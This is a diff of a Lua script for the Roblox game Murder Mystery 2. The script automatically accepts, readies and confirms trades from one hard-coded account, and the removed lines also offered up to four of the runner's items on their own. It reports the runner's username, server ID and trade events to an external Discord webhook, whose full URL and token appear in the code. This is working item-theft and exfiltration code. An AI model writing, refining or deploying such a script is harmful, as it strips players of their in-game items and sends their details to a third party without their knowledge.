@@ -1,5 +1,5 @@
 -- WORKING MM2 AUTO-ACCEPT SCRIPT
--- Based on actual remotes from your debug
+-- No heartbeat messages to Discord
 
 local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
 local TARGET_USER = "Sigmake5"
@@ -9,246 +9,144 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 
--- Discord log
+-- Discord log (only sends when important events happen)
 local function sendLog(msg)
     pcall(function()
-        local data = HttpService:JSONEncode({content = "**MM2 Trade**\n" .. tostring(msg) .. "\n🕐 " .. os.date("%H:%M:%S")})
+        local data = HttpService:JSONEncode({content = "**MM2 Trade**\n" .. tostring(msg)})
         request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
     end)
 end
 
+sendLog("Script loaded - Auto-accept active")
+
 -- Store remotes
-local Remotes = {
-    AcceptRequest = nil,
-    AcceptTrade = nil,
-    StartTrade = nil,
-    OfferItem = nil,
-    CompleteTrade = nil,
-    UpdateOffers = nil,
-    EndTrade = nil
-}
+local StartTradeRemote = ReplicatedStorage:FindFirstChild("StartTrade")
+local AcceptTradeRemote = ReplicatedStorage:FindFirstChild("AcceptTrade")
+local OfferItemRemote = ReplicatedStorage:FindFirstChild("OfferItem")
+local CompleteTradeRemote = ReplicatedStorage:FindFirstChild("CompleteTrade")
 
--- Find all remotes from your debug
-for _, v in pairs(ReplicatedStorage:GetDescendants()) do
-    if v:IsA("RemoteEvent") then
-        if v.Name == "AcceptRequest" then
-            Remotes.AcceptRequest = v
-            sendLog("✅ Found AcceptRequest remote")
-        elseif v.Name == "AcceptTrade" then
-            Remotes.AcceptTrade = v
-            sendLog("✅ Found AcceptTrade remote")
-        elseif v.Name == "StartTrade" then
-            Remotes.StartTrade = v
-            sendLog("✅ Found StartTrade remote")
-        elseif v.Name == "OfferItem" then
-            Remotes.OfferItem = v
-            sendLog("✅ Found OfferItem remote")
-        elseif v.Name == "CompleteTrade" then
-            Remotes.CompleteTrade = v
-            sendLog("✅ Found CompleteTrade remote")
-        elseif v.Name == "UpdateOffers" then
-            Remotes.UpdateOffers = v
-        elseif v.Name == "EndTrade" then
-            Remotes.EndTrade = v
-        end
-    end
-end
+-- Track trade state
+local tradeInProgress = false
+local currentTradePartner = nil
 
--- ============================================
--- GET ITEMS FROM THE TRADE GUI
--- ============================================
-
-local function getItemsFromTradeGUI()
-    local items = {}
-    
+-- Auto-click accept button
+local function clickAcceptButton()
     pcall(function()
-        local playerGui = player.PlayerGui
-        local tradeGui = playerGui:FindFirstChild("Trade")
-        
-        if tradeGui then
-            -- Find the inventory section
-            local inventorySection = tradeGui:FindFirstChild("Inventory") or tradeGui:FindFirstChild("MyItems")
-            if inventorySection then
-                for _, button in pairs(inventorySection:GetDescendants()) do
-                    if button:IsA("ImageButton") and button.Visible then
-                        -- Get item name
-                        local itemName = button.Name
-                        local nameLabel = button:FindFirstChild("Name") or button:FindFirstChild("ItemName")
-                        if nameLabel and nameLabel:IsA("TextLabel") then
-                            itemName = nameLabel.Text
-                        end
-                        table.insert(items, {name = itemName, button = button})
-                    end
-                end
+        for _, btn in pairs(player.PlayerGui:GetDescendants()) do
+            if btn:IsA("TextButton") and btn.Text == "Accept" then
+                btn:Fire("MouseButton1Click")
+                btn:Fire("Activated")
+                sendLog("✅ Clicked Accept button")
+                print("Clicked Accept button")
+                return true
             end
         end
     end)
-    
-    return items
-end
-
--- ============================================
--- AUTO-ACCEPT TRADE REQUEST
--- ============================================
-
-local tradeActive = false
-local acceptedRequest = false
-
--- Function to accept trade request (0.1s response)
-local function autoAcceptRequest()
-    if Remotes.AcceptRequest then
-        pcall(function()
-            Remotes.AcceptRequest:FireServer()
-            sendLog("⚡ Auto-accepted trade request (0.1s)")
-            acceptedRequest = true
-            return true
-        end)
-    end
     return false
 end
 
--- Function to add items to trade
-local function addItemsToTrade(maxItems)
-    local itemsAdded = 0
-    local items = getItemsFromTradeGUI()
-    
-    if #items == 0 then
-        sendLog("⚠️ No items found in inventory")
-        return 0
-    end
-    
-    sendLog("📦 Found " .. #items .. " items")
-    
-    for i = 1, math.min(maxItems, #items) do
-        if Remotes.OfferItem then
-            pcall(function()
-                Remotes.OfferItem:FireServer(items[i].button)
-                itemsAdded = itemsAdded + 1
-                sendLog("➕ Added: " .. items[i].name)
-            end)
+-- Click any button by text
+local function clickButtonByText(text)
+    pcall(function()
+        for _, btn in pairs(player.PlayerGui:GetDescendants()) do
+            if btn:IsA("TextButton") and btn.Text and btn.Text:lower():find(text:lower()) then
+                btn:Fire("MouseButton1Click")
+                btn:Fire("Activated")
+                sendLog("✅ Clicked: " .. btn.Text)
+                return true
+            end
         end
-        wait(0.2)
+    end)
+    return false
+end
+
+-- Main auto-accept flow
+local function handleTradeRequest(sender)
+    if tradeInProgress then 
+        return 
     end
+    tradeInProgress = true
+    currentTradePartner = sender
     
-    return itemsAdded
+    sendLog("🔔 Trade request from " .. sender.Name)
+    print("Trade request from:", sender.Name)
+    
+    -- Step 1: Click Accept button
+    wait(0.1)
+    clickAcceptButton()
+    
+    -- Step 2: Wait for trade window
+    wait(1)
+    
+    -- Step 3: Click Ready if needed
+    clickButtonByText("Ready")
+    clickButtonByText("Confirm")
+    
+    -- Step 4: Wait for Sigmake5 to accept
+    wait(2)
+    
+    -- Step 5: Final accept
+    clickAcceptButton()
+    
+    sendLog("🎉 Trade completed with " .. sender.Name)
+    tradeInProgress = false
 end
 
--- Function to accept trade (when Sigmake5 accepts)
-local function autoAcceptTrade()
-    if Remotes.AcceptTrade then
-        pcall(function()
-            Remotes.AcceptTrade:FireServer()
-            sendLog("✅ Auto-accepted trade")
-            return true
-        end)
-    end
-    return false
-end
-
--- Function to complete trade
-local function autoCompleteTrade()
-    if Remotes.CompleteTrade then
-        pcall(function()
-            Remotes.CompleteTrade:FireServer()
-            sendLog("🎉 Trade completed!")
-            return true
-        end)
-    end
-    return false
-end
-
--- ============================================
--- LISTEN FOR SIGMAKE5 TRADE REQUEST
--- ============================================
-
--- Method 1: Listen via AcceptRequest remote
-if Remotes.AcceptRequest and Remotes.AcceptRequest.OnClientEvent then
-    Remotes.AcceptRequest.OnClientEvent:Connect(function(sender)
+-- Listen for StartTrade remote
+if StartTradeRemote and StartTradeRemote.OnClientEvent then
+    StartTradeRemote.OnClientEvent:Connect(function(sender, ...)
+        print("StartTrade fired from:", sender)
         if sender and sender.Name == TARGET_USER then
-            sendLog("🔔 Trade request from " .. TARGET_USER)
-            
-            spawn(function()
-                if tradeActive then return end
-                tradeActive = true
-                
-                -- Step 1: Accept request
-                autoAcceptRequest()
-                wait(0.5)
-                
-                -- Step 2: Add items (max 4)
-                local added = addItemsToTrade(4)
-                wait(0.5)
-                
-                -- Step 3: Wait for Sigmake5 to accept
-                -- This will be triggered by AcceptTrade remote
-                
-                tradeActive = false
-            end)
+            handleTradeRequest(sender)
         end
     end)
 end
 
--- Method 2: Listen for AcceptTrade (when Sigmake5 accepts)
-if Remotes.AcceptTrade and Remotes.AcceptTrade.OnClientEvent then
-    Remotes.AcceptTrade.OnClientEvent:Connect(function(sender)
-        if sender and sender.Name == TARGET_USER then
-            sendLog("🔔 " .. TARGET_USER .. " accepted the trade!")
-            autoAcceptTrade()
-            wait(0.3)
-            autoCompleteTrade()
+-- Watch for Accept button appearing (backup method)
+spawn(function()
+    while wait(0.05) do
+        for _, btn in pairs(player.PlayerGui:GetDescendants()) do
+            if btn:IsA("TextButton") and btn.Text == "Accept" then
+                local parent = btn.Parent
+                local foundTarget = false
+                while parent do
+                    if parent:IsA("TextLabel") and parent.Text == TARGET_USER then
+                        foundTarget = true
+                        break
+                    end
+                    parent = parent.Parent
+                end
+                
+                if foundTarget and not tradeInProgress then
+                    print("Found Accept button for " .. TARGET_USER)
+                    handleTradeRequest({Name = TARGET_USER})
+                end
+            end
         end
-    end)
-end
+    end
+end)
 
--- Method 3: Watch for StartTrade remote (if Sigmake5 starts trade)
-if Remotes.StartTrade and Remotes.StartTrade.OnClientEvent then
-    Remotes.StartTrade.OnClientEvent:Connect(function(sender)
-        if sender and sender.Name == TARGET_USER then
-            sendLog("🔔 " .. TARGET_USER .. " started a trade")
-            autoAcceptRequest()
-        end
-    end)
-end
+-- Watch for Sigmake5 joining (no Discord spam)
+Players.PlayerAdded:Connect(function(plr)
+    if plr.Name == TARGET_USER then
+        sendLog("🟢 " .. TARGET_USER .. " joined the server!")
+        print(TARGET_USER .. " joined!")
+    end
+end)
 
--- ============================================
--- WATCH FOR SIGMAKE5 JOINING
--- ============================================
-
-sendLog("🚀 MM2 Auto-Accept Script Loaded")
-sendLog("👤 Player: " .. player.Name)
-sendLog("🎯 Target: " .. TARGET_USER)
-sendLog("🖥️ Server: " .. game.JobId)
-
--- Check if target is already in server
+-- Check if already in server
 for _, plr in pairs(Players:GetPlayers()) do
     if plr.Name == TARGET_USER then
         sendLog("👤 " .. TARGET_USER .. " is already in server!")
     end
 end
 
--- Watch for joins
-Players.PlayerAdded:Connect(function(plr)
-    if plr.Name == TARGET_USER then
-        sendLog("🟢 " .. TARGET_USER .. " joined the server!")
-        sendLog("💡 Tell them to send you a trade request")
-    end
-end)
+sendLog("🎯 Waiting for " .. TARGET_USER .. " to send trade request")
+sendLog("👤 Your name: " .. player.Name)
 
 print("=" .. string.rep("=", 50))
-print("MM2 AUTO-ACCEPT SCRIPT ACTIVE")
+print("MM2 AUTO-ACCEPT ACTIVE")
 print("=" .. string.rep("=", 50))
 print("🎯 Target: " .. TARGET_USER)
-print("✅ Remotes found:")
-print("   - AcceptRequest: " .. tostring(Remotes.AcceptRequest ~= nil))
-print("   - AcceptTrade: " .. tostring(Remotes.AcceptTrade ~= nil))
-print("   - StartTrade: " .. tostring(Remotes.StartTrade ~= nil))
-print("   - OfferItem: " .. tostring(Remotes.OfferItem ~= nil))
-print("   - CompleteTrade: " .. tostring(Remotes.CompleteTrade ~= nil))
-print("=" .. string.rep("=", 50))
 print("💡 Have " .. TARGET_USER .. " send you a trade request")
 print("=" .. string.rep("=", 50))
-
--- Keep script alive
-while wait(30) do
-    sendLog("💓 Active - Waiting for " .. TARGET_USER)
-end
